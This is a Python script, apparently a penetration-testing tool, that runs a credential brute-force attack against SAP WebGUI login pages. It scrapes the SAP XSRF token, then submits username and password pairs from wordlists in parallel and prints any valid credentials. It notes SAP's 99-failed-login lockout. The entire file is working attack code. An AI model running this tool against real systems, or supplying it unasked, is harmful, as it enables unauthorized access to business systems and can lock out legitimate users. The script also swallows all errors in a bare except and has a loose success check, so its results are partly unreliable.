#!/usr/bin/env python3

import requests, concurrent.futures
from bs4 import BeautifulSoup
from argparse import ArgumentParser
from urllib3.exceptions import InsecureRequestWarning
from itertools import repeat

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

banner = """
  ___   _   ___  __      __   _               _   ___          _        __
 / __| /_\ | _ \ \ \    / /__| |__  __ _ _  _(_) | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___
 \__ \/ _ \|  _/  \ \/\/ / -_) '_ \/ _` | || | | | _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_)
 |___/_/ \_\_|     \_/\_/\___|_.__/\__, |\_,_|_| |___/_|  \_,_|\__\___|_| \___/_| \__\___|
                                   |___/
"""

def build_url(options):
        if options.SSL:
                url =  "https://{}:{}{}".format(str(options.SERVER), str(options.PORT), str(options.URL_PREFIX))
        else:
                url =  "http://{}:{}{}".format(str(options.SERVER), str(options.PORT), str(options.URL_PREFIX))
        return str(url)

def handle_login(URL, options, USERNAME, PASSWORD):
        HEADERS = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Referer': URL + '?sap-client=' + options.CLIENT,
                'Origin': 'http://' + options.SERVER + ":" + options.PORT,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        session = requests.session()
        session.get(URL, verify=False, allow_redirects=True)
        r = session.get(URL, verify=False, allow_redirects=True)
        soup = BeautifulSoup(r.text, 'lxml')
        csrf_token = soup.select('input', name="sap-login-XSRF")[6]
        XSRF_COOKIE = csrf_token['value']

        PARAMS = {
                'FOCUS_ID': 'sap-user',
                'sap-system-login-oninputprocessing': 'onLogin',
                'sap-urlscheme': '',
                'sap-system-login': 'onLogin',
                'sap-system-login-basic_auth': '',
                'sap-accessibility': '',
                'sap-login-XSRF': XSRF_COOKIE,
                'sap-system-login-cookie_disabled': '',
                'sysid': options.SAP_SID,
                'sap-client': options.CLIENT,
                'sap-user': USERNAME,
                'sap-password': PASSWORD,
                'sap-language': 'EN',
                'sap-language-dropdown': 'English'
        }

        r = session.post(URL, headers=HEADERS, data=PARAMS, verify=False)

        return r.status_code, r.history, r.text

def do_bruteforce(URL, options, user, password):
        username = user.strip("\n")
        ret_code, ret_oldcode, html_body = handle_login(URL, options, username, password)
        if ((ret_code == 200) and (len(ret_oldcode) > 0)) or ('not&#x20;correct' not in html_body):
                print(f"[+] Username/Password found: {username}:{password}\n")
        else:
                None

def parse_options():
        description = "This script does a simple Brute Force attack against SAP WebGUI. For that it can handle the SAP specific 'XSRF' Cookies and Request parameters."
        usage = "%(prog)s [options]"
        parser = ArgumentParser(usage=usage, description=description)
        target = parser.add_argument_group("Target")
        target.add_argument("--sid", dest="SAP_SID", help="SAP System ID", required=True)
        target.add_argument("--target", dest="SERVER", help="IP/Hostname of Target Server", required=True)
        target.add_argument("--port", dest="PORT", help="HTTP Port of Target Server (default: 8000)", default="8000")
        target.add_argument("--client", dest="CLIENT", help="Define the client to login to (default: 001)", default="001")
        target.add_argument("--url", dest="URL_PREFIX", help="Define URL prefix (default: sap/bc/gui/sap/its/webgui)", default="/sap/bc/gui/sap/its/webgui")
        target.add_argument("--user-file", dest="USER_FILE", help="Path to file with usernames (one per line)")
        target.add_argument("--pass-file", dest="PASS_FILE", help="Path to file with password (one per line)")
        target.add_argument("--ssl", dest="SSL", help="SSL True/False", default=False)
        options = parser.parse_args()

        return options

def buffer_wordlist(options):
        user_lst = []
        pw_lst = []
        print("[*] Loading user wordlist...")
        with open(options.USER_FILE, "r") as usrfile:
                for user in usrfile:
                        user_lst.append(user)

        print("[*] Loading password wordlist...")
        with open(options.PASS_FILE) as pwfile:
                for password in pwfile:
                        password = password.strip("\n")
                        pw_lst.append(password)
        if len(pw_lst) > 99:
                print(f"[-] CAUTION: there are more than 99 passwords in the wordlist file: {options.PASS_FILE}")
                                

        return user_lst, pw_lst

def main():
        options = parse_options()
        try:
                URL = build_url(options)
                print(f"[+] Using the following URL: {URL}\n")
                usrfile, pwfile = buffer_wordlist(options)
                for user in usrfile:
                        user = user.strip("\n")
                        print(f"[*] Testing User {user}")
                        with concurrent.futures.ProcessPoolExecutor() as executor:
                                processing =  executor.map(do_bruteforce, repeat(URL), repeat(options), repeat(user), pwfile)

        except:
                pass

print(banner)
print("CAUTION: SAP allows max. 99 failed logins for a user!")
print("\n")
main()
